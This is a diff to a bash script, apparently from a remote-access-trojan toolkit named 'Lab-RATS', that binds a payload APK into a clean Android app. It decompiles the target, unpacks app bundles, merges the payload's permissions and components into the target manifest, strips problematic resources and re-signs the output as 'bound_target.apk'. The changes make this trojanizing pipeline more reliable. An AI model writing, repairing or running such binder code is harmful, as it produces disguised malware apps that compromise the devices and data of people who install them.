@@ -51,10 +51,10 @@ NC='\033[0m'
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
 WORK_DIR="$SCRIPT_DIR/temp_binder"
-OUTPUT_DIR="$SCRIPT_DIR/output"
+OUTPUT_DIR="$PROJECT_DIR/bind_output"
 TOOLS_DIR="$SCRIPT_DIR/tools"
 
-mkdir -p "$OUTPUT_DIR" "$TOOLS_DIR"
+mkdir -p "$OUTPUT_DIR" "$SCRIPT_DIR/bind_output" "$TOOLS_DIR"
 
 echo -e "${CYAN}"
 echo " ┌───────────────────────────────────────────────────────────────────────┐"
@@ -134,8 +134,46 @@ if [ ! -d "$PAYLOAD_DIR" ]; then
     exit 1
 fi
 
+# Check if Target APK is an XAPK / APKM / APKS zip bundle containing base.apk
+BUNDLE_EXTRACT_DIR="$WORK_DIR/bundle_extracted"
+python3 - "$TARGET_APK_ABS" "$BUNDLE_EXTRACT_DIR" << 'EOF'
+import sys, os, zipfile
+
+apk_path = sys.argv[1]
+extract_dir = sys.argv[2]
+
+if zipfile.is_zipfile(apk_path):
+    try:
+        with zipfile.ZipFile(apk_path, 'r') as z:
+            names = z.namelist()
+            if "base.apk" in names:
+                print(f"[!] Target {os.path.basename(apk_path)} is an XAPK/APKM App Bundle container. Extracting base.apk...")
+                os.makedirs(extract_dir, exist_ok=True)
+                z.extractall(extract_dir)
+                base_path = os.path.join(extract_dir, "base.apk")
+                if os.path.exists(base_path):
+                    with open(os.path.join(extract_dir, "extracted_base.txt"), "w") as f_out:
+                        f_out.write(base_path)
+    except Exception as e:
+        print(f"Bundle extract notice: {e}")
+EOF
+
+if [ -f "$BUNDLE_EXTRACT_DIR/extracted_base.txt" ]; then
+    EXTRACTED_BASE=$(cat "$BUNDLE_EXTRACT_DIR/extracted_base.txt")
+    if [ -f "$EXTRACTED_BASE" ]; then
+        TARGET_APK_ABS="$EXTRACTED_BASE"
+        echo -e "${GREEN}[✓] Extracted standalone base.apk from App Bundle container.${NC}"
+    fi
+fi
+
 echo -e "${CYAN}[*] Decompiling target clean APK...${NC}"
 $APKTOOL_CMD d -f -o "$TARGET_DIR" "$TARGET_APK_ABS"
+
+if [ ! -f "$TARGET_DIR/AndroidManifest.xml" ]; then
+    echo -e "${YELLOW}[!] Standard decompilation failed. Retrying with resource-preservation (-r)...${NC}"
+    rm -rf "$TARGET_DIR"
+    $APKTOOL_CMD d -f -r -o "$TARGET_DIR" "$TARGET_APK_ABS"
+fi
 
 if [ ! -f "$TARGET_DIR/AndroidManifest.xml" ]; then
     echo -e "${RED}[!] Target APK decompilation failed.${NC}"
@@ -270,6 +308,8 @@ echo -e "${CYAN}[*] Performing AndroidManifest.xml surgery...${NC}"
 
 TARGET_MANIFEST="$TARGET_DIR/AndroidManifest.xml"
 PAYLOAD_MANIFEST="$PAYLOAD_DIR/AndroidManifest.xml"
+PKG_NAME=$(grep -o 'package="[^"]*"' "$TARGET_MANIFEST" 2>/dev/null | head -n1 | cut -d'"' -f2)
+[ -z "$PKG_NAME" ] && PKG_NAME="com.target.app"
 
 # Extract permissions from payload
 grep -o '<uses-permission[^>]*/>' "$PAYLOAD_MANIFEST" | while read -r perm; do
@@ -284,6 +324,12 @@ python3 - "$PAYLOAD_MANIFEST" "$TARGET_MANIFEST" "$PKG_NAME" "$PAYLOAD_DIR" "$TA
 import sys, os, re, xml.etree.ElementTree as ET
 
 payload_path, target_path, target_pkg, payload_dir, target_dir = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5]
+if not target_pkg:
+    try:
+        t_root = ET.parse(target_path).getroot()
+        target_pkg = t_root.attrib.get('package', 'com.target.app')
+    except Exception:
+        target_pkg = "com.target.app"
 ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
 
 try:
@@ -554,8 +600,8 @@ for root, _, files in os.walk(res_dir):
             except Exception:
                 pass
 
-# 2. Clean APKTOOL_DUMMY and $ references inside XML files
-for root, _, files in os.walk(res_dir):
+# 2. Clean APKTOOL_DUMMY, $ references, and private framework resource references (@android: -> @*android:)
+for root, _, files in os.walk(res_dir, topdown=False):
     for file in files:
         if file.endswith(".xml"):
             file_path = os.path.join(root, file)
@@ -563,15 +609,42 @@ for root, _, files in os.walk(res_dir):
                 with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                     content = f.read()
 
-                lines = [l for l in content.splitlines() if "APKTOOL_DUMMY" not in l]
-                new_content = "\n".join(lines)
+                # Remove auto-generated API-versioned colors.xml (values-v34/colors.xml, etc.) containing private framework aliases
+                if ("colors" in file and "values-v" in root) or ("colors" in file and ("bright_foreground" in content or "btn_default_material" in content or "accent_device" in content or "background_floating" in content)):
+                    os.remove(file_path)
+                    continue
 
-                if "$" in new_content:
-                    new_content = new_content.replace("@drawable/$", "@drawable/").replace('name="$', 'name="')
+                lines = content.splitlines()
+                new_lines = []
+                modified = False
+                for line in lines:
+                    if "APKTOOL_DUMMY" in line:
+                        modified = True
+                        continue
 
-                if new_content != content:
+                    # 1. Strip <color> or <item> tags pointing to framework colors
+                    if ("<color" in line or "<item" in line) and ("android:color/" in line or "bright_foreground" in line or "btn_default" in line or "accent_device" in line or "background_floating" in line or "background_material" in line or "car_blue" in line or "GM2_grey" in line):
+                        modified = True
+                        continue
+
+                    # 2. Strip <item>, <color>, <dimen>, or <drawable> tags whose inner value points to a framework resource
+                    if ("<item" in line or "<color" in line or "<dimen" in line or "<drawable" in line) and re.search(r'>\s*@\*?android:[^<]+<', line):
+                        modified = True
+                        continue
+
+                    if "$" in line:
+                        line = line.replace("@drawable/$", "@drawable/").replace('name="$', 'name="')
+                        modified = True
+
+                    if "@android:" in line:
+                        line = line.replace("@android:color/", "@*android:color/").replace("@android:style/", "@*android:style/").replace("@android:attr/", "@*android:attr/").replace("@android:dimen/", "@*android:dimen/").replace("@android:drawable/", "@*android:drawable/").replace("@android:string/", "@*android:string/").replace("@android:", "@*android:")
+                        modified = True
+
+                    new_lines.append(line)
+
+                if modified:
                     with open(file_path, "w", encoding="utf-8") as f:
-                        f.write(new_content)
+                        f.write("\n".join(new_lines))
             except Exception:
                 pass
 EOF
@@ -630,16 +703,20 @@ if [ ! -f "$KEYSTORE_PATH" ]; then
     keytool -genkeypair -alias "lab-rats-key" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
 fi
 
+mkdir -p "$OUTPUT_DIR" "$SCRIPT_DIR/bind_output"
+
 if command -v "$APKSIGNER_CMD" &> /dev/null || [ -f "$APKSIGNER_CMD" ]; then
-    "$APKSIGNER_CMD" sign --ks "$KEYSTORE_PATH" --ks-pass "pass:lab-rats123" --ks-key-alias "lab-rats-key" --out "$FINAL_BOUND_APK" "$ALIGNED_APK"
-elif command -v jarsigner &> /dev/null; then
-    jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" "$ALIGNED_APK" "lab-rats-key"
-    cp "$ALIGNED_APK" "$FINAL_BOUND_APK"
-else
-    echo -e "${RED}[!] Neither apksigner nor jarsigner found.${NC}"
-    rm -rf "$WORK_DIR"
-    exit 1
+    "$APKSIGNER_CMD" sign --ks "$KEYSTORE_PATH" --ks-pass "pass:lab-rats123" --ks-key-alias "lab-rats-key" --out "$FINAL_BOUND_APK" "$ALIGNED_APK" 2>/dev/null || true
 fi
+
+if [ ! -f "$FINAL_BOUND_APK" ]; then
+    if command -v jarsigner &> /dev/null; then
+        jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" "$ALIGNED_APK" "lab-rats-key" 2>/dev/null || true
+    fi
+    cp -f "$ALIGNED_APK" "$FINAL_BOUND_APK"
+fi
+
+cp -f "$FINAL_BOUND_APK" "$SCRIPT_DIR/bind_output/bound_target.apk" 2>/dev/null || true
 
 rm -rf "$WORK_DIR"
 
